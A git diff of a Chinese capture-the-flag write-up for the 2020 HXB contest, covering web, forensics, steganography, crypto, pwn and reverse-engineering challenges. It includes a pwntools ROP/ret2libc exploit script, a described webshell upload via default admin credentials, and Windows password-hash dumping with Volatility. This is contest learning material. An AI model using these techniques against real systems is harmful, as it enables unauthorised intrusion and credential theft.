@@ -2,7 +2,7 @@
 title: 2020hxb-Writeup-cOMING
 urlname: 2020hxb-Writeup-cOMING
 date: 2020-11-13 09:22:25
-updated: 
+updated: 2020-12-23 09:22:25
 comments: false
 tags: 
   - 内存取证
@@ -18,6 +18,7 @@ permalink:
 ## 队伍情况
 队伍名称：cOMING
 
+![](2020hxb-Writeup-cOMING/b98885edfaae8f28a1142482b1c5a273.png)
 
 ## 队伍成员
 gyy,Trick,hxq
@@ -25,67 +26,88 @@ gyy,Trick,hxq
 ## Web
 
 ### 题目名字不重要反正题挺简单的
-直接白给phpinfo
-../?file=phpinfo
 
+直接白给phpinfo http://47.111.104.169:57301/?file=phpinfo
+
+![](2020hxb-Writeup-cOMING/3374b2c0d3129c0282de5d456026c0f9.png)
 
 ### NewWebsite
 
 进网站找后台./admin/
 输入用户名密码均为admin登陆成功,html发现有/?r=manageinfo，进入改头像，上传一句话木马，蚁剑连上可得flag
 
+![](2020hxb-Writeup-cOMING/031b1eb11298e4c672f6e91a3b07b170.png)
+
 91d7fbeecf940113dfca79a0194d8292
 
 ## MISC
 
 ### passwd
+
 `volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw  imageinfo`
-![](http://err0r.top:3000/uploads/upload_c347085b1db7d7268268cc2014b40fac.png)
-内存取证 win7：
-`volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86_23418 hashdump`
-![](http://err0r.top:3000/uploads/upload_3ff9c3b3f49563b975214ae71195a024.png)
-MD5解出CTF：
-aad3...：空密码
-0a64...:qwer1234
-再结合题目：we need sha1(password)!!!
-sha1解密qwer1234
-![](http://err0r.top:3000/uploads/upload_5ab11806f4d8e3e805a49794e8319db5.png)
+
+![](2020hxb-Writeup-cOMING/7b3aaf83f2a475ad5cab06c8856973c4.png)
+
+内存取证 win7： `volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw
+--profile=Win7SP1x86_23418 hashdump`
+
+![](2020hxb-Writeup-cOMING/4d11382c75521a279254c1d8f939e7e2.png)
+
+MD5解出
+
+CTF：
+
+aad3…：空密码
+
+0a64…:qwer1234
+
+再结合题目：we need sha1(password)!!! sha1
+
+解密qwer1234
+
+![](2020hxb-Writeup-cOMING/ee50c0fb45bc04ff9f82fad1289d5ec8.png)
+
 出flag
 
 ### 虚实之间
+
 开文件发现`mingwen - 副本.txt`是伪加密,拖出来打包后明文攻击
+
 爆破得密码：123%asd!O
 
-![](http://err0r.top:3000/uploads/upload_333a962f0581af1e5b081ed38eaacbfa.png)
+![](2020hxb-Writeup-cOMING/1a7883d1491cfe53eb8d922f1251ee04.png)
 
-```
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 仅需5，跳过去
 ffd5e341le25b2dcab15cbb}gc3bc5b{789b51
-```
-联想栅栏加密
-直接出flag
-![](http://err0r.top:3000/uploads/upload_497c21ab22bea253cc028dd0f698d4a5.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+联想栅栏加密 直接出flag
+
+![](2020hxb-Writeup-cOMING/b510b2e1aae50a2ba791f6bac42dcdc2.png)
 
 ### 颜文字
 
 东西很多，最终发现这有个.html是有用的
-![](http://err0r.top:3000/uploads/upload_d56b5da1e48c1f700196da21ac72d6e6.png)
+
+![](2020hxb-Writeup-cOMING/9302d47555b72dfa1fd14d8a8b8394e2.png)
 
 打开，F12
-![](http://err0r.top:3000/uploads/upload_3dc7159e9614178aa1cb3dad56ac147f.png)
+
+![](2020hxb-Writeup-cOMING/f2ffd31423755c064eb38a0e7dc062f5.png)
+
 发现base64
 
-```
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 KO+9oe+9peKIgO+9pSnvvonvvp7ll6hIaX4gCm==
-KO+8oF/vvKA7KSjvvKBf77ygOyko77ygX++8oDspCr==	      	 	      	    
-KCtfKyk/KOOAgj7vuL88KV/OuCjjgII+77i/PClfzrgK  	     	    	    	      
-bygq77+j4pa977+jKinjg5bjgpwK      	       	    	   	  	      
-77yc77yI77y+77yN77y+77yJ77yeKOKVr+KWveKVsCAp5aW96aaZfn4K 	       	      
-44O9KOKcv+++n+KWve++nynjg44o77yg77y+77yQ77y+KQp=  		       	    
+KO+8oF/vvKA7KSjvvKBf77ygOyko77ygX++8oDspCr==                            
+KCtfKyk/KOOAgj7vuL88KV/OuCjjgII+77i/PClfzrgK                                  
+bygq77+j4pa977+jKinjg5bjgpwK                                      
+77yc77yI77y+77yN77y+77yJ77yeKOKVr+KWveKVsCAp5aW96aaZfn4K                  
+44O9KOKcv+++n+KWve++nynjg44o77yg77y+77yQ77y+KQp=                    
 KF5e44Kezqgo77+j4oiA77+jKc6oKuKYhSzCsCo6LuKYhijvv6Pilr3vv6MpLyQ6Ki7CsOKYhSog44CCCp==
 flwo4omn4pa94ommKS9+byhe4pa9XilvKMKs4oC/wqwpKCriiafvuLbiiaYpKSjvv6Pilr3vv6MqICnjgp7ilLPilIHilLMo4pWv4oC14pah4oCyKeKVr++4teKUu+KUgeKUuwp=
-4pSz4pSB4pSzIOODjigg44KcLeOCnOODjingsqBf4LKgCn==       		     	 
+4pSz4pSB4pSzIOODjigg44KcLeOCnOODjingsqBf4LKgCn==                     
 4LKgX+CyoCjila/igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF/CrCApCp==
 KOODjuOBuO+/o+OAgSlvKO+/o+KUsO+/oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+/o++4v++/oyko77+jzrUoI++/oykK
 KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i/zKvMv++/ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo=
@@ -110,17 +132,16 @@ KG/vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+/o+KWve+/oyl+KOKdpCDP
 KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i/zKvMv++/ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq=
 KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY/ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCl==
 KG/vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+/o+KWve+/oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCi==
-KOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIK      	  	     	 
-KOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIK  	     		   
-KOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIK	   	  	 
+KOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIK                     
+KOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIK                   
+KOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIK             
 KOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIo4pWv4oC14pah4oCyKeKVr+eCuOW8ue+8geKAouKAouKAoijila/igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIK
 ZmxhZ+iiq+aIkeeCuOayoeS6huWTiOWTiOWTiC==
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-```
 解密后：
 
-```
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 (｡･∀･)ﾉﾞ嗨Hi~ 
 
 (＠_＠;)(＠_＠;)(＠_＠;)
@@ -196,42 +217,47 @@ o(*￣▽￣*)ブ゜
 (╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••
 
 flag被我炸没了哈哈哈
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-```
 空格和base64加密的颜文字
+
 stegsnow解出现乱码
+
 拿颜文字的base64跑base64隐写，得到秘钥`lorrie`
+
 连到自己的服务器上nc保存文件
-![](http://err0r.top:3000/uploads/upload_e1246d8da57831ac61db9db06a8cb7e7.png)
 
+![](2020hxb-Writeup-cOMING/24f08c5af60b185a313ee1463c9a4852.png)
 
-![](http://err0r.top:3000/uploads/upload_a9d05ca3684423b0bdec23e5ad4bdc0d.png)
+![](2020hxb-Writeup-cOMING/113c837089faeae4e4cbf169b26103f2.png)
 
-![](http://err0r.top:3000/uploads/upload_87e30c8ce32bf823f52a6995d01008de.png)
+![](2020hxb-Writeup-cOMING/a6cd84af9e66703249e6d040b8378d79.png)
+
 `→_→`替换为`-`,`←_←`替换为`.`,去网站上解码
-![](http://err0r.top:3000/uploads/upload_37297a6534ae9687e762575520e3be88.png)
 
-![](http://err0r.top:3000/uploads/upload_deb9e10ded0547223c72de150e3e7986.png)
+![](2020hxb-Writeup-cOMING/4be4b33a5bdc0c72d555bcf347fc81dd.png)
 
-
-
+![](2020hxb-Writeup-cOMING/f9ede18047cccbfc556a9c345a0beac0.png)
 
 ## CRYPTO
 
 ### 古典美++
-利用网站工具得维吉尼亚密码密钥
-![](http://err0r.top:3000/uploads/upload_f1091c0a40a04c7e0ca2ff4ee943818e.png)
-为`orderby`
-生成MD5
-![](http://err0r.top:3000/uploads/upload_08211c0d9eea3dd803668f9de50f81d9.png)
 
+利用网站工具得维吉尼亚密码密钥
+
+![](2020hxb-Writeup-cOMING/7623653b8d5fa7474f7a021105bcc064.png)
+
+为`orderby` 生成MD5
+
+![](2020hxb-Writeup-cOMING/5ac8fcc0d5536abdee804959d8a3c242.png)
 
 ## Pwn
 
 ### pwn_printf
 
 exp:
-```
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 from pwn import *
 from LibcSearcher import *
 context.log_level = 'debug'
@@ -248,7 +274,7 @@ scanf = 0x4006A0
 pop_rsi_ret = 0x401211
 p.recvuntil("You will find this game very interesting")
 for i in range(16):
-	p.sendline("32")
+    p.sendline("32")
 payload1 = b'a'*0x8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(0x40) + p64(v_addr)
 p.sendline(payload1)
 p.recvline()
@@ -273,26 +299,29 @@ payload3 = b'a' * 0x8 + p64(pop_rdi) + p64(0x06030A0) + p64(puts_addr-0x2a300)
 sleep(0.5)
 p.sendline(payload3)
 p.interactive()
-
-
-```
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 ## Re
-### easyre
-爆破，逐个击破。。。
-实在不会。。。
-### easy_c++
-IDA分析
-一个信息
-![](http://err0r.top:3000/uploads/upload_e925529013db912c18fefedaaf9abb14.png)
 
-![](http://err0r.top:3000/uploads/upload_4e828399e4d79eb1e6be0a043cbef7d5.png)
+### easyre
+
+爆破，逐个击破。。。
+
+easy_c++
+
+IDA分析 一个信息
+
+![](2020hxb-Writeup-cOMING/61a2caae7f31cbfc365432119425d6fd.png)
+
+![](2020hxb-Writeup-cOMING/565ff985b4b771d98409ec3233eb8309.png)
+
 长度32
 
-![](http://err0r.top:3000/uploads/upload_73c378ef6b63554e866b77cfb0a64ee2.png)
+![](2020hxb-Writeup-cOMING/17aa83fa3a88db01f27c8fb3d41c5e5f.png)
 
 exp：
-```
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 public class Test {
     public static void main(String[] args) {
         String a = "7d21e<e3<:3;9;ji t r#w\"$*{*+*$|,";
@@ -306,28 +335,30 @@ public class Test {
         }
     }
 }
-```
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 ### ReMe
 
 反编译py
-```
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 python3 pyinstxtractor.py ReMe.exe
-```
-![](http://err0r.top:3000/uploads/upload_e3d5fa410ab6018e37d44d0eb186cae4.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+![](2020hxb-Writeup-cOMING/1393ddb113bda2babe004c8a7bd44c13.png)
 
 010打开
-![](http://err0r.top:3000/uploads/upload_2b11c9c4724fb034f52d40b7f29ca891.png)
+
+![](2020hxb-Writeup-cOMING/38a8bb796f44edf49bb8ec9ae28a850c.png)
+
 置换之后：
-![](http://err0r.top:3000/uploads/upload_f2d172c13f5b680885e029a91c53a5ee.png)
+
+![](2020hxb-Writeup-cOMING/0b91b5d7322cfcb630981982098feea8.png)
+
 改后缀：ReMe.pyc
 
-```
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 uncompyle6 ReMe.pyc
-```
-
-```
 λ uncompyle6 ReMe.pyc
 # uncompyle6 version 3.7.4
 # Python bytecode 3.7 (3394)
@@ -397,12 +428,11 @@ if __name__ == '__main__':
     print('You win!')
     print('flag{' + md5.hexdigest() + '}')
 # okay decompiling ReMe.pyc
-
-```
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 exp:
 
-```
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 import hashlib
 
 check = [
@@ -440,30 +470,19 @@ def func(number):
         ret.append(number)
     return ret
 for i in range(1,128):
-	a = func(i)
-	ans = ""
-	for j in range(len(a)):
-		ans += str(a[j])
-		ans += str(a[(len(a) - j - 1)])
-	md5 = hashlib.md5()
-	md5.update(ans.encode('utf-8'))
-	b = md5.hexdigest()
-	for j in range(27):
-		if b == check[j]:
-			print chr(i),j
+    a = func(i)
+    ans = ""
+    for j in range(len(a)):
+        ans += str(a[j])
+        ans += str(a[(len(a) - j - 1)])
+    md5 = hashlib.md5()
+    md5.update(ans.encode('utf-8'))
+    b = md5.hexdigest()
+    for j in range(27):
+        if b == check[j]:
+            print chr(i),j
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-```
+跑出 flag{My_M\@th_3X+1_R3v_Te5t} 再跑md5
 
-跑出
-flag{My_M@th_3X+1_R3v_Te5t}
-再跑md5
-![](http://err0r.top:3000/uploads/upload_cb85bf35027674506b95399974b01eee.png)
-
-
-
-
-
----
----
-
-最后可能进不了决赛，有点菜，不过坚持到了最后，继续加油吧！
+![](2020hxb-Writeup-cOMING/ac2500682b8e1112e9a89ce1b1f97465.png)
